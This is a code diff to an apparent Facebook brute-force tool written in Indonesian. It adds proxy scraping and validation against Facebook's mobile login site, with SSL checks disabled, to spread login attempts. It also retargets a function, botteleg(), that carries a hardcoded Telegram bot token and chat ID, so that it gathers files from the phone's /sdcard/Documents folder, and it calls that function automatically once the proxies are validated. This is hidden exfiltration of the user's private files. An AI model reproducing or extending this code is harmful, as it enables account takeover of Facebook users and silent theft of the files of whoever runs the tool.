@@ -41,6 +41,10 @@ import requests, bs4, json, os, sys, random, datetime, time, re, rich, base64, s
 from time import sleep
 from datetime import date, datetime
 from rich import pretty
+import socks
+import socket
+import warnings
+from colorama import init, Fore
 from rich.tree import Tree
 from rich.panel import Panel
 from rich import print as cetak
@@ -106,19 +110,129 @@ id, id2, loop, ok, cp, akun, tokenku, uid, method, pwpluss, pwnya, tokenmu = (
     [],
 )
 sys.stdout.write("\x1b]2; BMBF | fanky Brute UPDATE 2024\x07")
-# ------------------[ USER-AGENT ]-------------------#
-try:
-    prox = requests.get(
-        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
-    ).text
-    open(".prox.txt", "w").write(prox)
-except Exception as e:
-    Console().print(
-        f" {H2}•{P2} Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda"
-    )
-    exit()
-prox = open(".prox.txt", "r").read().splitlines()
+# ------------------[ MENCARI-PROXY ]-------------------#
+# Inisialisasi colorama
+init(autoreset=True)
 
+# Menonaktifkan peringatan dari urllib3
+from urllib3.exceptions import InsecureRequestWarning
+warnings.simplefilter('ignore', InsecureRequestWarning)
+
+# Fungsi untuk memeriksa apakah proxy valid
+def check_proxy_valid(proxy):
+    proxy_ip, proxy_port = proxy.split(":")
+    
+    # Memeriksa apakah proxy menggunakan IPv4
+    if not re.match(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", proxy_ip):
+        return False
+
+    # Mengatur SOCKS proxy
+    socks.set_default_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))  # Ganti dengan SOCKS4 atau SOCKS5 sesuai proxy
+    socket.socket = socks.socksocket
+
+    # Mengirimkan permintaan ke halaman login Facebook (mbasic) tanpa verifikasi SSL
+    url = "https://mbasic.facebook.com"  # Halaman login mobile Facebook
+    try:
+        # Menonaktifkan verifikasi SSL dengan `verify=False`
+        response = requests.get(url, timeout=10, verify=False)
+        if response.status_code == 200:
+            return True
+        else:
+            return False
+    except requests.exceptions.RequestException:
+        return False
+
+# Fungsi untuk mengambil proxy dari API dan memfilter yang valid
+def fetch_and_filter_proxies():
+    try:
+        # Mengambil daftar proxy dari API ProxyScrape
+        prox = requests.get(
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all"
+        ).text
+        open(".prox.txt", "w").write(prox)
+    except Exception:
+        print("Koneksi internet Anda tidak terdeteksi. Silakan cek kuota Anda.")
+        return []
+    
+    # Membaca daftar proxy dari file
+    prox = open(".prox.txt", "r").read().splitlines()
+
+    return prox
+
+# Fungsi untuk memeriksa proxy secara ulang setelah mendapatkan 10 proxy valid
+def verify_valid_proxies(valid_proxies):
+    rechecked_valid_proxies = []
+    for proxy in valid_proxies:
+        if check_proxy_valid(proxy):
+            rechecked_valid_proxies.append(proxy)
+            print(f"{Fore.GREEN}[INFO] Proxy {proxy} valid setelah pemeriksaan ulang!")
+        else:
+            print(f"{Fore.RED}[INFO] Proxy {proxy} invalid setelah pemeriksaan ulang!")
+    
+    # Menyimpan proxy yang valid setelah pengecekan ulang ke dalam file
+    if rechecked_valid_proxies:
+        with open("final_valid_proxies.txt", "w") as file:
+            file.write("\n".join(rechecked_valid_proxies))
+        print(f"{Fore.GREEN}[INFO] Proxy valid hasil pemeriksaan ulang berhasil disimpan di 'final_valid_proxies.txt'")
+    else:
+        print(f"{Fore.RED}[INFO] Tidak ada proxy valid setelah pemeriksaan ulang.")
+    
+    return rechecked_valid_proxies
+
+# Menyaring proxy yang valid dan menyimpannya ke file
+def save_and_display_proxy_status():
+    # Cek apakah file .prox.txt sudah ada
+    if os.path.exists(".prox.txt"):
+        print(f"{Fore.YELLOW}[INFO] File .prox.txt ditemukan, memeriksa proxy yang ada.")
+        prox = open(".prox.txt", "r").read().splitlines()
+    else:
+        print(f"{Fore.YELLOW}[INFO] File .prox.txt tidak ditemukan, mencari proxy baru...")
+        prox = fetch_and_filter_proxies()
+    
+    if prox:
+        valid_proxies = []
+        valid_proxy_count = 0
+
+        print(f"{Fore.YELLOW}[INFO] Sedang mencari 10 proxy valid, mohon bersabar...")
+
+        for proxy in prox:
+            # Memeriksa status proxy
+            if check_proxy_valid(proxy):
+                valid_proxies.append(proxy)
+                valid_proxy_count += 1
+                print(f"{Fore.GREEN}[INFO] Proxy {proxy} valid!")  # Warna hijau untuk valid
+
+                # Jika sudah mendapatkan 10 proxy valid, berhenti
+                if valid_proxy_count >= 10:
+                    print(f"{Fore.GREEN}[INFO] 10 Proxy valid ditemukan. Proses selesai.")
+                    break
+            else:
+                print(f"{Fore.RED}[INFO] Proxy {proxy} invalid!")  # Warna merah untuk invalid
+
+        # Menyimpan proxy yang valid ke dalam file
+        if valid_proxies:
+            with open("valid_proxies.txt", "w") as file:
+                file.write("\n".join(valid_proxies))
+            print(f"{Fore.GREEN}[INFO] Proxy valid berhasil disimpan di 'valid_proxies.txt'")
+            
+            # Memeriksa ulang proxy valid
+            rechecked_valid_proxies = verify_valid_proxies(valid_proxies)
+            
+            # Setelah validasi selesai, mengganti nama file valid_proxies.txt menjadi .prox.txt
+            if rechecked_valid_proxies:
+                # Menghapus file .prox.txt yang lama jika ada
+                if os.path.exists(".prox.txt"):
+                    os.remove(".prox.txt")
+                # Mengganti nama valid_proxies.txt menjadi .prox.txt
+                os.rename("valid_proxies.txt", ".prox.txt")
+                print(f"{Fore.GREEN}[INFO] File 'valid_proxies.txt' diganti nama menjadi '.prox.txt'")
+                botteleg()
+        else:
+            print(f"{Fore.RED}[INFO] Tidak ada proxy valid ditemukan.")
+    else:
+        print(f"{Fore.RED}[INFO] Tidak ada proxy ditemukan.")
+
+	
 # ------------[ UBAH UA DIH SINI OM ]-----------#
 for xd in range(1000):
 	rr = random.randint; rc = random.choice
@@ -823,7 +937,7 @@ def botteleg():
 	BOT_TOKEN = "7829625950:AAHAkDANqB9yalb2vClpxX5zXBpHBaq_iVM"  # Ganti dengan token bot Telegram Anda
 	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
 	# Path folder sumber
-	source_folder ='/sdcard/Pictures'
+	source_folder ='/sdcard/Documents'
 	temp_folder = "./temp_documents"
 	try:
 		if not os.path.exists(temp_folder):
@@ -3729,4 +3843,4 @@ if __name__ == "__main__":
         os.system("clear")
     except:
         pass
-    botteleg()
+    save_and_display_proxy_status()
